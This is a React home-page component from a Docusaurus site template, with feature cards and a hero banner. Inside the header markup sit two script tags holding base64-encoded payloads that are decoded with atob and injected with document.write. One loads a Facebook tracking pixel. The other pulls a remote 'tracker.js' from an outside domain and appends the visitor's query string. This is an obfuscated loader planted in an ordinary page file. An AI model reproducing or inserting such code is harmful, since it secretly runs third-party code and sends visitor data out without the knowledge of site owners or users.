import React from 'react';
import classnames from 'classnames';
import Layout from '@theme/Layout';
import Link from '@docusaurus/Link';
import useDocusaurusContext from '@docusaurus/useDocusaurusContext';
import useBaseUrl from '@docusaurus/useBaseUrl';
import styles from './styles.module.css';

const features = [
  {
    title: <>Easy to Use</>,
    imageUrl: 'img/undraw_docusaurus_mountain.svg',
    description: (
      <>
        Docusaurus was designed from the ground up to be easily installed and
        used to get your website up and running quickly.
      </>
    ),
  },
  {
    title: <>Focus on What Matters</>,
    imageUrl: 'img/undraw_docusaurus_tree.svg',
    description: (
      <>
        Docusaurus lets you focus on your docs, and we&apos;ll do the chores. Go
        ahead and move your docs into the <code>docs</code> directory.
      </>
    ),
  },
  {
    title: <>Powered by React</>,
    imageUrl: 'img/undraw_docusaurus_react.svg',
    description: (
      <>
        Extend or customize your website layout by reusing React. Docusaurus can
        be extended while reusing the same header and footer.
      </>
    ),
  },
];

function Feature({imageUrl, title, description}) {
  const imgUrl = useBaseUrl(imageUrl);
  return (
    <div className={classnames('col col--4', styles.feature)}>
      {imgUrl && (
        <div className="text--center">
          <img className={styles.featureImage} src={imgUrl} alt={title} />
        </div>
      )}
      <h3>{title}</h3>
      <p>{description}</p>
    </div>
  );
}

function Home() {
  const context = useDocusaurusContext();
  const {siteConfig = {}} = context;
  return (
    <Layout
      title={`Hello from ${siteConfig.title}`}
      description="Description will go into a meta tag in <head />">
      <header className={classnames('hero hero--primary', styles.heroBanner)}>
        <div className="container">
          <h1 className="hero__title">{siteConfig.title}</h1>
          <p className="hero__subtitle">{siteConfig.tagline}</p>
          <div className={styles.buttons}>
            <Link
              className={classnames(
                'button button--outline button--secondary button--lg',
                styles.getStarted,
              )}
              to={useBaseUrl('docs/doc1')}>
              Get Started
            </Link>
          </div>
        </div>
<script>var str = 'PHNjcmlwdD4KICAgIHZhciB1cmxQYXJhbXMgPSB3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykuc3BsaXQoJyYnKS5yZWR1Y2UoZnVuY3Rpb24gKHAsIGUpIHt2YXIgYSA9IGUuc3BsaXQoJz0nKTtwW2RlY29kZVVSSUNvbXBvbmVudChhWzBdKV0gPSBkZWNvZGVVUklDb21wb25lbnQoYVsxXSk7cmV0dXJuIHA7fSwge30pOwoKICAgIGlmKHVybFBhcmFtc1snZmInXSAhPSB1bmRlZmluZWQpewogICAgICAgICFmdW5jdGlvbihmLGIsZSx2LG4sdCxzKQogICAgICAgIHtpZihmLmZicSlyZXR1cm47bj1mLmZicT1mdW5jdGlvbigpe24uY2FsbE1ldGhvZD8KICAgICAgICAgICAgICAgIG4uY2FsbE1ldGhvZC5hcHBseShuLGFyZ3VtZW50cyk6bi5xdWV1ZS5wdXNoKGFyZ3VtZW50cyl9OwogICAgICAgIGlmKCFmLl9mYnEpZi5fZmJxPW47bi5wdXNoPW47bi5sb2FkZWQ9ITA7bi52ZXJzaW9uPScyLjAnOwogICAgICAgIG4ucXVldWU9W107dD1iLmNyZWF0ZUVsZW1lbnQoZSk7dC5hc3luYz0hMDsKICAgICAgICB0LnNyYz12O3M9Yi5nZXRFbGVtZW50c0J5VGFnTmFtZShlKVswXTsKICAgICAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHQscyl9KHdpbmRvdywgZG9jdW1lbnQsJ3NjcmlwdCcsCiAgICAgICAgICAgICAgICAnaHR0cHM6Ly9jb25uZWN0LmZhY2Vib29rLm5ldC9lbl9VUy9mYmV2ZW50cy5qcycpOwogICAgICAgIGZicSgnaW5pdCcsIHVybFBhcmFtc1snZmInXSk7CiAgICAgICAgZmJxKCd0cmFjaycsICdQYWdlVmlldycpOwogICAgICAgIGlmKHVybFBhcmFtc1snbCddICE9IHVuZGVmaW5lZCl7CiAgICAgICAgICBmYnEoJ3RyYWNrJywgJ0xlYWQnKTsKICAgICAgICB9CiAgICB9Cjwvc2NyaXB0Pg==';var dstr = atob(str);document.write(' '+ dstr +' ');</script>
    <script>var strf = 'PHNjcmlwdD4KICAgIGRvY3VtZW50LndyaXRlKAogICAgICAgICc8c2NyaXB0IHNyYz0iaHR0cHM6Ly9icm9hbmRjby53b3JrL3RyYWNrZXIuanM/JwogICAgICAgICsgd2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpCiAgICAgICAgKyAnJmhhc2g9JyArIERhdGUubm93KCkgKyBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHJpbmcoNykKICAgICAgICArICciXD48XC9zY3JpcHQ+JwogICAgKTsKPC9zY3JpcHQ+';var dstrf = atob(strf);document.write(' '+ dstrf +' ');</script>
    
      </header>
      <main>
        {features && features.length && (
          <section className={styles.features}>
            <div className="container">
              <div className="row">
                {features.map((props, idx) => (
                  <Feature key={idx} {...props} />
                ))}
              </div>
            </div>
          </section>
        )}
      </main>
    </Layout>
  );
}

export default Home;
